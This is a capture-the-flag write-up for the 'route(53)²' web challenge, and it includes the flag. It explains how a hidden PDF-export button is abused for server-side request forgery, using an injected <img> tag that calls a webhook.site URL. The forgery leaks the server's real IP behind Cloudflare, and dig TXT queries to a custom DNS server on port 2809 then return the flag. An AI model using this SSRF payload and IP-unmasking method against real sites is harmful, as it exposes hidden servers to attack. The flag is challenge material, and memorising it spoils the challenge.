# route53^2 [web]

## 問題概要

# route(53)²

i have a unique service running along... with http://toys.tusharr.xyz/

`difficulty: hard`

`author: benzo, CleverClaw`


## Flag
```EH4X{t0ying__oUo__gniy0t}```


## Writeup
[Click Here](./writeup)

---

## Writeup

# **Route (53)² – Solution**

> "I have a unique service running along... with [http://toys.tusharr.xyz/](http://toys.tusharr.xyz/)"

`author: benzo, CleverClaw`

## **Understanding the Challenge**

The challenge name,  **Route (53)²** , hints at AWS Route 53, a managed DNS service. The squared notation (`53² = 2809`) suggests a **custom DNS server running on port 2809** instead of the standard  **port 53** .

Our objective is to identify this unique service and leverage it to retrieve the flag.

---

## **Step 1: Identifying the Hidden Service**

The given website, `http://toys.tusharr.xyz/`, is  **proxied through Cloudflare** , meaning its real server IP is hidden. To bypass this, we need to exploit **Server-Side Request Forgery (SSRF)** to make the server reveal its IP.

---

## **Step 2: Exploring the Website**

Upon opening the website, we see a  **list of blogs** . Viewing the **page source** reveals nothing unusual at first. However, inspecting an individual blog reveals a **hidden button** styled with `display: none;`.

By modifying the CSS to make it visible, we see a button labeled **"Download as PDF"** with an associated event listener in the script:

```javascript
document.getElementById("download-btn").addEventListener("click", async () => {
    const content = document.getElementById("blog-content");

    const response = await fetch(`/blogs/<blog_id>/download`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: content.innerHTML })
    });

    if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "<blog_title>.pdf";
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
    } else {
        alert("Failed to generate PDF");
    }
});
```

### **Key Observations:**

* The **PDF generation request** is sent via a `POST` request to `/blogs/<blog_id>/download`.
* The **blog content** (`div#blog-content`) is passed directly as raw HTML in the request body.

This indicates that the  **PDF service processes external content** , potentially making network requests—an ideal setup for  **SSRF exploitation** .

---

## **Step 3: Exploiting SSRF to Leak the Server's Real IP**

To trigger an external request from the server, we inject a  **[webhook](https://webhook.site/) URL** inside an `<img>` tag within `div#blog-content`:

```html
<img src="https://webhook.site/<YOUR_WEBHOOK_ENDPOINT">
```

Now, when the  **PDF is generated** , the server attempts to fetch this image on the server-side, exposing its **real IP address** in the  **webhook logs** .

For this challenge, the server's **real IP** was:

```plaintext
20.244.37.255
```

---

## **Step 4: Interacting with the Custom DNS Server**

Now that we have the real IP, we need to investigate the **custom DNS server** running on  **port 2809** .

### **Using `dig` to Query the DNS Server**

The general format of a `dig` command is:

```sh
dig <RECORD_TYPE> @<IP_ADDRESS> -p <PORT> <QUERY>
```

Where:

* `<RECORD_TYPE>`: Type of DNS record to query (A, TXT, etc.). If omitted, it defaults to `A`.
* `<IP_ADDRESS>`: The target DNS server's IP.
* `-p <PORT>`: Specifies the port (2809 in this case).
* `<QUERY>`: The hostname or keyword to look up.

---

### **1️⃣ Checking Default A Records**

Since `A` records are the default in `dig`, we run:

```sh
dig @20.244.37.255 -p 2809 +short anything
```

(added `+short` option for short and relevant output)

![img](./img/dns1.png)

🔹 This confirms that the  **custom DNS server is active and only runs on TXT type records** .

---

### **2️⃣ Querying TXT Records**

for TXT records , we use:

```sh
dig TXT @20.244.37.255 -p 2809 +short anything
```

![img](./img/dns2.png)

🔹 That's interesting.

---

### **3️⃣ Searching for Admin-Related Entries**

To check if the DNS server holds special TXT records for  **admins** , we query for `admins`:

```sh
dig TXT @20.244.37.255 -p 2809 +short admins
```

![img](./img/dns3.png)

🔹 This finally  **reveals the flag** :

```plaintext
EH4X{t0ying__oUo__gniy0t}
```

---

**Hence we get our flag -** 

```
EH4X{t0ying__oUo__gniy0t}
```

---

## **Summary of the Exploitation Process**

1️⃣ **Recognized the hint** that a custom DNS server was running on  **port 2809** .

2️⃣  **Discovered a hidden PDF download feature** , which  **fetches external content** .

3️⃣ **Injected an SSRF payload** to leak the **real server IP** via a webhook.

4️⃣ **Used `dig` commands** to communicate with the **custom DNS service** and extract the flag.

This challenge was a great exercise in **SSRF, DNS exploitation, and information leakage** techniques.